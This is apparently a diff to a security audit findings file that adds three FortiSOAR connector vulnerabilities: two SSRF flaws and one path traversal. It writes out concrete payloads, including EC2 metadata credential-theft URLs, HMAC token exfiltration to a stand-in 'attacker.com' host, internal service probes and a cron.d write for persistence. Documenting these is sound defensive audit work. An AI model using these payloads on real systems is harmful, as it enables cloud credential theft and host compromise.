@@ -1349,3 +1349,173 @@ FSR_F18_SSH_CONNECTOR_VULNERABILITIES = {
         "F18c: Validate that private_key @id URL is a FortiSOAR-local IRI (starts with /api/3/files/)."
     ),
 }
+
+# FSR-F19: cyops_utilities -- api_call / make_fcp_request SSRF (CWE-918)
+# Component: cyops-connector-cyops_utilities v3.7.2 (http.py, crudhub.py)
+# cs_approved: True, publisher: Fortinet
+# Copyright: 2008-2026 Fortinet Inc.
+#
+# Operations exposed: api_call ("Make REST API Call"), make_fcp_request ("Make API Call")
+# Both operations are available to ANY FortiSOAR user with playbook execution rights.
+#
+# api_call (http.py:24-47):
+#   requests.request(method, url, **request_args)
+#   - `url` = fully user-controlled, no scheme/host validation
+#   - `method` = fully user-controlled (GET/POST/PUT/DELETE/CONNECT/etc.)
+#   - `verify` = user-controlled SSL bypass (default True, but user can set False)
+#   - Response returned directly to playbook step output (JSON or bytes)
+#
+# make_fcp_request (crudhub.py:448-458):
+#   make_request(url=url, method=method, body=body)
+#   - `url` = fully user-controlled
+#   - make_request() adds FortiSOAR HMAC authentication headers to outbound request
+#   - If URL is attacker-controlled, the HMAC token is leaked to the attacker
+#   - Attacker can replay the HMAC token against FortiSOAR's internal API
+#   - If URL is an internal service, request carries FortiSOAR auth credentials
+#
+# EC2 IMDSv1 credential theft chain (confirmed viable by aws-commands connector design):
+#   1. api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+#      -> returns IAM role name
+#   2. api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>')
+#      -> returns AccessKeyId, SecretAccessKey, Token
+#
+# Internal service enumeration:
+#   - http://localhost:5432/ -> PostgreSQL banner
+#   - http://localhost:15672/api/nodes -> RabbitMQ management (if management plugin active)
+#   - http://localhost:27017/ -> MongoDB banner
+#   - http://localhost:9978/ -> ChromaDB HTTP API (if running)
+#   - http://localhost:10447/ -> AI assistant listener (FSR-F13 link)
+
+FSR_F19_CYOPS_UTILITIES_SSRF = {
+    "id": "FSR-F19",
+    "title": "cyops_utilities api_call / make_fcp_request unrestricted SSRF",
+    "severity": "HIGH",
+    "cvss": "8.3",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+    "cwe": "CWE-918",
+    "component": "cyops-connector-cyops_utilities v3.7.2",
+    "source_files": ["http.py:24", "crudhub.py:448"],
+    "cs_approved": True,
+
+    "operations": {
+        "api_call": {
+            "description": "Unauthenticated SSRF to any URL",
+            "payload": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "impact": "EC2 IAM credential theft; internal service enumeration",
+        },
+        "make_fcp_request": {
+            "description": "Authenticated SSRF -- FortiSOAR HMAC token leaked to target URL",
+            "payload": "url=http://attacker.com/collect",
+            "impact": "FortiSOAR HMAC token exfiltration for internal API replay",
+        },
+    },
+
+    "ec2_credential_chain": [
+        "api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/')",
+        "api_call(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>')",
+        "-> returns: AccessKeyId, SecretAccessKey, Token",
+    ],
+
+    "fix": (
+        "Validate URL scheme (https only). "
+        "Maintain allowlist of permitted URL patterns (external TI feeds, configured integrations). "
+        "Block RFC 1918 IP ranges and link-local (169.254.0.0/16) at network layer."
+    ),
+}
+
+# FSR-F20: cyops_utilities -- xor_byte_file_decryption arbitrary write to /tmp/<output_file>
+# Component: cyops-connector-cyops_utilities v3.7.2 (files.py:682-706)
+# CWE-22: Path traversal on output file destination
+#
+# Vulnerable code (files.py:695-698):
+#   temp_target_filename = os.path.join("/tmp/", output_file)
+#   file = open(temp_target_filename, "w")
+#   for ch in file_data:
+#       xored = ch ^ key_to_decrypt
+#       file.write(chr(xored))
+#
+# No check_file_traversal() call on output_file parameter.
+# os.path.join("/tmp/", "../etc/cron.d/malicious") = "/tmp/../etc/cron.d/malicious"
+# open() resolves this to /etc/cron.d/malicious (if process has write access).
+#
+# The written content is the XOR-decrypted input file, one char per byte.
+# An attacker controlling both input_file content and key_to_decrypt=0 (XOR with 0 = identity)
+# can write arbitrary content to the target path.
+# XOR key 0x00 = identity transform; all original bytes preserved.
+#
+# Note: impact depends on cyops-worker process user privileges.
+# If running as a non-root user, /etc/ writes fail.
+# However, writes to /opt/cyops/ connector directory, FortiSOAR Python path,
+# or any world-writable directory would achieve code persistence.
+#
+# check_file_traversal uses os.commonprefix() -- known broken:
+# os.commonprefix compares character by character, not path component by component.
+# If TMP_FILE_ROOT = '/tmp/uploads', then '/tmp/uploads2/malware' passes the check:
+#   commonprefix(['/tmp/uploads2/malware', '/tmp/uploads']) == '/tmp/uploads' -> no error
+# Actual safe check requires os.path.commonpath() (Python 3.5+) or trailing / comparison.
+
+FSR_F20_CYOPS_UTILITIES_FILE_WRITE = {
+    "id": "FSR-F20",
+    "title": "cyops_utilities xor_byte_file_decryption path traversal on output_file (no validation)",
+    "severity": "HIGH",
+    "cvss": "6.3",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "cwe": "CWE-22",
+    "component": "cyops-connector-cyops_utilities v3.7.2",
+    "source_file": "files.py:695",
+
+    "root_cause": (
+        "xor_byte_file_decryption() passes output_file directly to os.path.join('/tmp/', output_file) "
+        "then opens the resulting path for writing. No check_file_traversal() call on output_file. "
+        "os.path.join('/tmp/', '../etc/cron.d/malicious') = '/tmp/../etc/cron.d/malicious' "
+        "which open() resolves to /etc/cron.d/malicious."
+    ),
+
+    "payload": {
+        "input_file": "<attacker-controlled file with desired content>",
+        "output_file": "../etc/cron.d/pwned",
+        "key_to_decrypt": "0x00",
+    },
+
+    "secondary_finding": (
+        "check_file_traversal() in files.py:380-394 uses os.path.commonprefix() "
+        "which is character-prefix comparison, not path-component comparison (CWE-22). "
+        "Bypass: if TMP_FILE_ROOT='/tmp/uploads', path '/tmp/uploads2/x' shares prefix. "
+        "Fix: replace with os.path.commonpath() (Python 3.5+)."
+    ),
+}
+
+# FSR-F21: cyops_utilities -- download_file_from_url SSRF + verify=False
+# Component: cyops-connector-cyops_utilities v3.7.2 (files.py:68-95)
+#
+# download_file_from_url(url, ...) -> requests.get(url=iri, stream=True, verify=False)
+# - No URL validation, no scheme/host allowlist
+# - verify=False hardcoded -- SSL cert not checked, MITM possible
+# - Response saved to TMP_FILE_ROOT, filename returned to caller
+# - Attacker chain: download_file_from_url(url='http://169.254.169.254/...') -> store in /tmp
+#   then download_file_from_cyops to retrieve content -> full SSRF exfil
+# - Different from FSR-F19: this SSRF saves response to disk, not direct API response return
+
+FSR_F21_CYOPS_UTILITIES_DOWNLOAD_SSRF = {
+    "id": "FSR-F21",
+    "title": "cyops_utilities download_file_from_url SSRF with verify=False",
+    "severity": "HIGH",
+    "cvss": "7.1",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "cwe": "CWE-918",
+    "component": "cyops-connector-cyops_utilities v3.7.2",
+    "source_file": "files.py:68,117",
+
+    "root_cause": (
+        "requests.get() called with user-supplied url, verify=False hardcoded. "
+        "No URL scheme or host validation. "
+        "Response content saved to TMP_FILE_ROOT as uuid filename. "
+        "Filename returned in cyops_file_path for downstream retrieval."
+    ),
+
+    "exfiltration_chain": [
+        "download_file_from_url(url='http://169.254.169.254/latest/meta-data/iam/security-credentials/role')",
+        "-> response saved to /tmp/<uuid>",
+        "download_file_from_cyops('/api/3/files/<uuid>') -> returns file content to playbook output",
+    ],
+}
